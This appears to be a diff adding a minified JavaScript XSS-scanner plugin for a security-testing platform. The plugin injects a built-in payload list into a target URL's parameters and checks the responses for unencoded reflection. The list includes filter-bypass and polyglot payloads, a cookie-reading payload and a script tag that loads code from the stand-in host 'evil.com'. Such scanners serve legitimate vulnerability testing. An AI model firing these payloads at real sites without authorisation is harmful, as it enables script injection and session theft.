+result={success:false,error:error instanceof Error?error.message:String(error)}}finally{while(scope.pending.size)await Promise.allSettled([...scope.pending]);activeScope=
+void 0}stream.assertHealthy();if(!result||typeof result.success!=="boolean")throw new Error("Monitor business must return a ToolOutput");const success=result.success===
+true;const data={results:[{target,output:result}]};await stream.record(target,"complete",{success:true,data},{status:success?"ok":"failed",complete:true,snapshot_complete:success,
+...success?{}:{error:String(result.error||"Business observation failed")}})}return await stream.finish()}catch(error){const failure={success:false,error:error instanceof
+Error?error.message:String(error)};try{return await stream.finish(failure)}catch(saveError){return{success:false,error:saveError instanceof Error?saveError.message:
+String(saveError)}}}}function monitorToolOutputSchema(business){const terminalData={type:"object",required:["stream_complete","summary"],properties:{stream_complete:{
+const:true},summary:{type:"object"}}};const terminal={type:"object",required:["success","data"],properties:{success:{const:true},data:terminalData}};const failure={
+type:"object",required:["success","error"],properties:{success:{const:false},error:{type:"string",minLength:1}}};return{type:"object",required:["success"],properties:{
+success:{type:"boolean",description:"Execution outcome"},data:{type:"object",description:"Business output or acknowledged monitor completion",properties:{stream_complete:{
+type:"boolean"},summary:{type:"object"}}},error:{type:"string",description:"Execution failure"}},anyOf:[business,terminal,failure]}}var pluginGlobals=globalThis;var DEFAULT_CONCURRENCY=5;var XSS_PAYLOADS={basic:[{payload:"<script>alert(1)</script>",type:"reflected",context:"html"},{payload:"<script>alert('XSS')</script>",type:"reflected",context:"\
+html"},{payload:"<ScRiPt>alert(1)</ScRiPt>",type:"reflected",context:"html"},{payload:"<script src=//evil.com/x.js></script>",type:"reflected",context:"html"}],
+event_handlers:[{payload:'"><img src=x onerror=alert(1)>',type:"reflected",context:"attribute"},{payload:`'"><img src=x onerror=alert(1)>`,type:"reflected",context:"\
+attribute"},{payload:"<img src=x onerror=alert(1)>",type:"reflected",context:"html"},{payload:"<svg onload=alert(1)>",type:"reflected",context:"html"},{payload:"\
+<body onload=alert(1)>",type:"reflected",context:"html"},{payload:"<input onfocus=alert(1) autofocus>",type:"reflected",context:"html"},{payload:"<marquee onsta\
+rt=alert(1)>",type:"reflected",context:"html"},{payload:"<video><source onerror=alert(1)>",type:"reflected",context:"html"},{payload:"<audio src=x onerror=alert\
+(1)>",type:"reflected",context:"html"},{payload:"<details open ontoggle=alert(1)>",type:"reflected",context:"html"}],attribute_escape:[{payload:'" onmouseover="\
+alert(1)" x="',type:"reflected",context:"attribute"},{payload:"' onmouseover='alert(1)' x='",type:"reflected",context:"attribute"},{payload:'" onfocus="alert(1)\
+" autofocus="',type:"reflected",context:"attribute"},{payload:"' onfocus='alert(1)' autofocus='",type:"reflected",context:"attribute"},{payload:'"><script>alert\
+(1)</script>',type:"reflected",context:"attribute"},{payload:"'><script>alert(1)</script>",type:"reflected",context:"attribute"}],javascript_context:[{payload:"\
+';alert(1);//",type:"reflected",context:"script"},{payload:'";alert(1);//',type:"reflected",context:"script"},{payload:"</script><script>alert(1)</script>",type:"\
+reflected",context:"script"},{payload:"'-alert(1)-'",type:"reflected",context:"script"},{payload:'"-alert(1)-"',type:"reflected",context:"script"},{payload:"${a\
+lert(1)}",type:"reflected",context:"template"},{payload:"{{constructor.constructor('alert(1)')()}}",type:"reflected",context:"template"}],url_context:[{payload:"\
+javascript:alert(1)",type:"reflected",context:"href"},{payload:"javascript:alert(document.domain)",type:"reflected",context:"href"},{payload:"data:text/html,<sc\
+ript>alert(1)</script>",type:"reflected",context:"href"},{payload:"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",type:"reflected",context:"href"}],
+encoding_bypass:[{payload:"<scr<script>ipt>alert(1)</scr</script>ipt>",type:"reflected",context:"filter_bypass"},{payload:"<scr\\x00ipt>alert(1)</scr\\x00ipt>",
+type:"reflected",context:"filter_bypass"},{payload:"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",type:"reflected",context:"filter_bypass"},{payload:"<img src=x on\
+error=\\u0061lert(1)>",type:"reflected",context:"filter_bypass"},{payload:"<img src=x onerror=&#97;lert(1)>",type:"reflected",context:"filter_bypass"},{payload:"\
+<img src=x onerror=&#x61;lert(1)>",type:"reflected",context:"filter_bypass"}],dom_based:[{payload:"#<script>alert(1)</script>",type:"dom",context:"fragment"},{payload:"\
+#javascript:alert(1)",type:"dom",context:"fragment"},{payload:"?default=<script>alert(1)</script>",type:"dom",context:"query"},{payload:"javascript:alert(docume\
+nt.cookie)",type:"dom",context:"href"}],polyglot:[{payload:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",type:"reflected",context:"polyglot"},{payload:`\
+'"-->]]>*/</script></style></title></textarea></noscript></template></select><script>alert(1)</script>`,type:"reflected",context:"polyglot"},{payload:"'-alert(1\
+)-'",type:"reflected",context:"polyglot"}]};var SECURITY_HEADERS=["content-security-policy","x-xss-protection","x-content-type-options"];function get_input_schema(){
+return{type:"object",required:["url"],properties:{url:{type:"string",description:"Target URL to test for XSS vulnerabilities"},method:{type:"string",enum:["GET",
+"POST","PUT","PATCH"],description:"HTTP method to use",default:"GET"},params:{type:"object",description:"URL parameters to test (key-value pairs)",additionalProperties:{
+type:"string"}},headers:{type:"object",description:"Custom headers to include",additionalProperties:{type:"string"}},body:{type:"string",description:"Request bo\
+dy (for POST/PUT/PATCH)"},contentType:{type:"string",description:"Content-Type header",default:"application/x-www-form-urlencoded"},userAgent:{type:"string",description:"\
+Custom User-Agent header"},testReflected:{type:"boolean",description:"Test for reflected XSS",default:true},testStored:{type:"boolean",description:"Test for sto\
+red XSS indicators",default:false},testDom:{type:"boolean",description:"Test for DOM-based XSS",default:true},customPayloads:{type:"array",items:{type:"string"},
+description:"Custom XSS payloads to test"},dictionaryId:{type:"string","x-control":"dictionary-picker","x-dictionary-type":"xss_payload",description:"Dictionary\
+ ID or name for XSS payloads"}}}}pluginGlobals.get_input_schema=get_input_schema;function getBusinessOutputSchema(){return{type:"object",properties:{success:{type:"\
+boolean",description:"Whether the operation succeeded"},data:{type:"object",properties:{url:{type:"string",description:"Target URL"},method:{type:"string"},tests:{
+type:"array",items:{type:"object",properties:{parameter:{type:"string"},payload:{type:"string"},vulnerable:{type:"boolean"},confidence:{type:"string"},evidence:{
+type:"string"}}},description:"XSS test results"},summary:{type:"object",properties:{totalTests:{type:"integer"},vulnerableCount:{type:"integer"},vulnerableParameters:{
+type:"array",items:{type:"string"}}}}}},error:{type:"string",description:"Error message if failed"}}}}pluginGlobals.get_output_schema=get_output_schema;function generateMarker(){
+const chars="abcdefghijklmnopqrstuvwxyz";let result="xss";for(let i=0;i<8;i++){result+=chars.charAt(Math.floor(Math.random()*chars.length))}return result}function extractParameters(url,body,contentType,providedParams){
+const params=new Map;if(providedParams){for(const[key,value]of Object.entries(providedParams)){params.set(key,{value,location:"provided"})}}try{const urlObj=new URL(
+url);urlObj.searchParams.forEach((value,key)=>{if(!params.has(key)){params.set(key,{value,location:"query"})}})}catch{const match=url.match(/\?(.+)/);if(match){
+match[1].split("&").forEach(pair=>{const[key,...rest]=pair.split("=");if(key&&!params.has(key)){params.set(key,{value:decodeURIComponent(rest.join("=")),location:"\
+query"})}})}}if(body){if(contentType?.includes("application/json")){try{const json=JSON.parse(body);const flatten=(obj,prefix="")=>{for(const[key,value]of Object.
+entries(obj)){const fullKey=prefix?`${prefix}.${key}`:key;if(typeof value==="object"&&value!==null&&!Array.isArray(value)){flatten(value,fullKey)}else if(typeof value===
+"string"&&!params.has(fullKey)){params.set(fullKey,{value,location:"body"})}}};flatten(json)}catch{}}else{body.split("&").forEach(pair=>{const[key,...rest]=pair.
+split("=");if(key&&!params.has(key)){params.set(key,{value:decodeURIComponent(rest.join("=")),location:"body"})}})}}return params}function buildTestUrl(baseUrl,paramName,payload){
+try{const url=new URL(baseUrl);url.searchParams.set(paramName,payload);return url.toString()}catch{const separator=baseUrl.includes("?")?"&":"?";return`${baseUrl}${separator}${encodeURIComponent(
+paramName)}=${encodeURIComponent(payload)}`}}function buildTestBody(originalBody,paramName,payload,contentType){if(contentType?.includes("application/json")){try{
+const json=JSON.parse(originalBody||"{}");const parts=paramName.split(".");let current=json;for(let i=0;i<parts.length-1;i++){if(!current[parts[i]])current[parts[i]]=
+{};current=current[parts[i]]}current[parts[parts.length-1]]=payload;return JSON.stringify(json)}catch{return originalBody||""}}else{const params=new URLSearchParams(
+originalBody||"");params.set(paramName,payload);return params.toString()}}function checkReflection(responseBody,marker,payload){if(!responseBody.includes(marker)){
+return{reflected:false,encoded:false,context:"",evidence:""}}if(responseBody.includes(payload)){const index2=responseBody.indexOf(payload);const start2=Math.max(
+0,index2-50);const end2=Math.min(responseBody.length,index2+payload.length+50);const context=responseBody.substring(start2,end2);if(/<script[^>]*>[^<]*$/i.test(
+context)||/^[^<]*<\/script>/i.test(context)){return{reflected:true,encoded:false,context:"script",evidence:context}}if(/on\w+\s*=\s*["'][^"']*$/i.test(context)){
+return{reflected:true,encoded:false,context:"event-handler",evidence:context}}if(/(?:href|src|action)\s*=\s*["'][^"']*$/i.test(context)){return{reflected:true,encoded:false,
+context:"url-attribute",evidence:context}}return{reflected:true,encoded:false,context:"html",evidence:context}}const index=responseBody.indexOf(marker);const start=Math.
+max(0,index-100);const end=Math.min(responseBody.length,index+marker.length+100);return{reflected:true,encoded:true,context:"encoded",evidence:responseBody.substring(
+start,end)}}function hasDangerousPatterns(body,marker){const patterns=[new RegExp(`<script[^>]*>[^<]*${marker}`,"i"),new RegExp(`on\\w+\\s*=\\s*["'][^"']*${marker}`,
+"i"),new RegExp(`<[^>]+\\s+on\\w+\\s*=.*${marker}`,"i"),new RegExp(`javascript:[^"']*${marker}`,"i")];return patterns.some(p=>p.test(body))}function checkSecurityHeaders(headers){
+const missing=[];const headerKeys=Object.keys(headers).map(k=>k.toLowerCase());for(const header of SECURITY_HEADERS){if(!headerKeys.includes(header)){missing.push(
+header)}}return missing}async function runWithConcurrency(tasks,concurrency){if(tasks.length===0){return[]}const limit=Math.max(1,Math.min(concurrency,tasks.length));
+const results=new Array(tasks.length);let nextIndex=0;const workers=Array.from({length:limit},async()=>{while(true){const index=nextIndex++;if(index>=tasks.length){
+return}results[index]=await tasks[index]()}});await Promise.all(workers);return results}async function loadPayloads(dictionaryId,customPayloads,testReflected,testDom){
+const payloads=[];if(customPayloads&&customPayloads.length>0){for(const p of customPayloads){payloads.push({payload:p,type:"custom",context:"unknown"})}}if(dictionaryId){
+try{if(typeof Sentinel!=="undefined"&&Sentinel.Dictionary){const words=await Sentinel.Dictionary.getWords(dictionaryId);if(words&&words.length>0){for(const p of words){
+payloads.push({payload:p,type:"dictionary",context:"unknown"})}return payloads}}}catch(e){console.debug(`Failed to load XSS dictionary: ${e}`)}}if(testReflected!==
+false){payloads.push(...XSS_PAYLOADS.basic);payloads.push(...XSS_PAYLOADS.event_handlers);payloads.push(...XSS_PAYLOADS.attribute_escape);payloads.push(...XSS_PAYLOADS.
+javascript_context);payloads.push(...XSS_PAYLOADS.url_context);payloads.push(...XSS_PAYLOADS.encoding_bypass);payloads.push(...XSS_PAYLOADS.polyglot)}if(testDom!==
+false){payloads.push(...XSS_PAYLOADS.dom_based)}const uniquePayloads=new Map;for(const payload of payloads){const key=`${payload.type}:${payload.context}:${payload.
+payload}`;if(!uniquePayloads.has(key)){uniquePayloads.set(key,payload)}}return Array.from(uniquePayloads.values())}async function analyzeBusiness(input){const startTime=performance.
+now();try{if(!input.url||typeof input.url!=="string"){return{success:false,error:"Invalid input: url parameter is required"}}let baseUrl=input.url;if(!baseUrl.startsWith(
+"http://")&&!baseUrl.startsWith("https://")){baseUrl=`https://${baseUrl}`}const method=(input.method||"GET").toUpperCase();const userAgent=input.userAgent||"Moz\
+illa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";const contentType=input.contentType||"application/x-www-form-urlencoded";const params=extractParameters(
+baseUrl,input.body,contentType,input.params);if(params.size===0){return{success:false,error:"No parameters found to test. Provide params or use a URL with query\
+ parameters."}}const payloads=await loadPayloads(input.dictionaryId,input.customPayloads,input.testReflected,input.testDom);const tests=[];const vulnerableParams=new Set;
+const compromisedParams=new Set;let missingHeaders=[];const marker=generateMarker();const tasks=[];for(const[paramName,{value,location}]of params){if(value.length>
+500)continue;for(const{payload:basePayload,type,context}of payloads){tasks.push(async()=>{if(compromisedParams.has(paramName)){return null}const payload=basePayload.
+replace(/alert\(1\)/g,`alert('${marker}')`);const testStart=performance.now();try{let testUrl=baseUrl;let testBody=input.body;if(location==="query"||location===
+"provided"){testUrl=buildTestUrl(baseUrl,paramName,payload)}else if(location==="body"){testBody=buildTestBody(input.body,paramName,payload,contentType)}const headers={
+"User-Agent":userAgent,Accept:"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",...input.headers};if(method!=="GET"&&testBody){headers["Content-\
+Type"]=contentType}const response=await observedFetch(testUrl,{method,headers,body:method!=="GET"?testBody:void 0,redirect:"follow",timeout:1e4});const responseTime=Math.
+round(performance.now()-testStart);if(missingHeaders.length===0){const respHeaders={};response.headers.forEach((v,k)=>{respHeaders[k]=v});missingHeaders=checkSecurityHeaders(
+respHeaders)}const respContentType=response.headers.get("content-type")||"";if(!respContentType.includes("text/html")&&!respContentType.includes("application/xh\
+tml")){return null}const body=await response.text();const reflection=checkReflection(body,marker,payload);if(reflection.reflected&&!reflection.encoded){const dangerous=hasDangerousPatterns(
+body,marker);compromisedParams.add(paramName);return{parameter:paramName,location,payload,payloadType:type,vulnerable:true,confidence:dangerous?"high":"medium",
+evidence:reflection.evidence.substring(0,300),context:reflection.context,responseCode:response.status,responseTime}}return null}catch(e){return null}})}}const results=await runWithConcurrency(
+tasks,DEFAULT_CONCURRENCY);for(const result of results){if(result&&result.vulnerable){tests.push(result);vulnerableParams.add(result.parameter)}}const uniqueTests=new Map;
+for(const test of tests){const key=`${test.parameter}:${test.context}`;const existing=uniqueTests.get(key);if(!existing||test.confidence==="high"&&existing.confidence!==
+"high"){uniqueTests.set(key,test)}}const finalTests=Array.from(uniqueTests.values());return{success:true,data:{url:baseUrl,method,tests:finalTests,summary:{totalTests:tasks.
+length,vulnerableCount:finalTests.length,testedParameters:Array.from(params.keys()),vulnerableParameters:Array.from(vulnerableParams),missingSecurityHeaders:missingHeaders}}}}catch(error){
+return{success:false,error:error instanceof Error?error.message:String(error)}}}pluginGlobals.analyze=analyze;function get_output_schema(){return monitorToolOutputSchema(
+getBusinessOutputSchema())}async function analyze(input){return await runMonitorTool(input,get_input_schema(),analyzeBusiness)}export{analyze,get_input_schema,get_output_schema};
+globalThis.get_input_schema=get_input_schema; globalThis.get_output_schema=get_output_schema; globalThis.analyze=analyze;
